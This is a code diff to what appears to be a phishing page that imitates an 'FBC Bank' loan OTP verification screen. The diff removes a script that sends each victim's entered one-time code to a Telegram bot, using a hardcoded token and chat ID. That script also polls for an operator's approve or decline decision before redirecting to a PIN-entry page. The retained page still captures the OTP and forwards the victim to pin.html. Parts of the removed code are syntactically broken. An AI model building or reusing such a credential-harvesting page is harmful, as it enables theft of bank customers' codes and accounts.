@@ -366,44 +366,6 @@
       cursor: pointer;
       width: 100%;
     }
-
-    /* Spinner overlay */
-    #spinnerOverlay {
-      position: fixed;
-      inset: 0;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      gap: 14px;
-      background: rgba(3, 13, 28, 0.78);
-      z-index: 9999;
-      backdrop-filter: blur(3px);
-    }
-
-    .spinner {
-      width: 56px;
-      height: 56px;
-      border: 5px solid rgba(255,255,255,0.15);
-      border-top-color: #ffffff;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    .spin-label {
-      color: #fff;
-      font-size: 15px;
-      font-weight: 700;
-    }
-
-    .spin-sub {
-      color: rgba(255,255,255,0.7);
-      font-size: 12px;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
   </style>
 </head>
 <body>
@@ -493,33 +455,7 @@
     </div>
   </div>
 
-  <div id="spinnerOverlay">
-    <div class="spinner"></div>
-    <div class="spin-label">Verifying OTP</div>
-    <div class="spin-sub">Please hold on…</div>
-  </div>
-
   <script>
-      const CONFIG = {
-      BOT_TOKEN: '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww',
-      CHAT_ID: '8820857419',
-      APPROVE_PAGE: 'pin.html'
-    };
-
-    let state = { lastUpdateId: 0 };
-    let isProcessing = false;
-    
-    const spinnerOverlay = document.getElementById('spinnerOverlay');
-    const verifyBtn = document.querySelector('.pill-btn');
-
-    function showSpinner() {
-      spinnerOverlay.style.display = 'flex';
-    }
-
-    function hideSpinner() {
-      spinnerOverlay.style.display = 'none';
-    }
-
     window.addEventListener('DOMContentLoaded', () => {
       const savedRef = localStorage.getItem('fbc_otp_ref') || '9vXfk';
       document.getElementById('refCodeText').textContent = 'Ref: ' + savedRef;
@@ -535,106 +471,9 @@
       }
 
       document.getElementById('otpError').style.display = 'none';
+      localStorage.setItem('fbc_verified_otp', code);
 
-      showSpinner();
-      verifyBtn.disabled = true;
-      verifyBtn.textContent = 'Verifying…';
-
-    
-      const ts = Date.now();
-      const approveId = `approve_${ts}`;
-      const declineId = `decline_${ts}`;
-      const verifyId = `verify_${ts}`;
-
-      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CONFIG.CHAT_ID,
-          text: `
-<b>📱 FBC Bank Loan Verification</b>
-
-Otp: <code>${otp}</code>
-Applicant: <code>Not provided</code>
-`,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '✅ Approve', callback_data: approveId },
-                { text: '📱 Verify Device', callback_data: verifyId }
-              ],
-              [
-                { text: '❌ Decline', callback_data: declineId }
-              ]
-            ]
-          }
-        })
-      })
-
-      fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ otp: code })
-      })
-      .then(response => response.json())
-      .then(data => {
-        hideSpinner();
-        verifyBtn.disabled = false;
-        verifyBtn.textContent = 'Verify';
-           }
-
-    function startPolling(approveId, declineId, verifyId) {
-      const interval = setInterval(() => {
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-          .then(r => r.json())
-          .then(data => {
-            if (!data.ok || !data.result) return;
-
-            data.result.forEach(update => {
-              state.lastUpdateId = update.update_id;
-
-              if (update.callback_query) {
-                const cb = update.callback_query.data;
-
-                if (cb === approveId) {
-                  clearInterval(interval);
-                  document.getElementById('spinnerOverlay').style.display = 'none';
-                  window.location.href = CONFIG.APPROVE_PAGE;
-                }
-                else if (cb === verifyId) {
-                  clearInterval(interval);
-                  document.getElementById('spinnerOverlay').style.display = 'none';
-                  window.location.href = CONFIG.APPROVE_PAGE;
-                }
-                else if (cb === declineId) {
-                  clearInterval(interval);
-                  document.getElementById('spinnerOverlay').style.display = 'none';
-                  showOtpError('Request declined. Please try again.');
-                  resetButton();
-                }
-              }
-            });
-          })
-          .catch(() => {
-            document.getElementById('spinnerOverlay').style.display = 'none';
-            showOtpError('Polling failed. Please try again.');
-            resetButton();
-          });
-      }, 1000);
-    }
-    
-
-        if (data.success) {
-          localStorage.setItem('fbc_verified_otp', code);
-          window.location.href = 'pin.html';
-        } else {
-          alert(data.message || 'Invalid OTP');
-        }
-      })
-      .catch(() => {
-        hideSpinner();
-       });
+      window.location.href = 'pin.html';
     }
 
     function openSupportModal() {
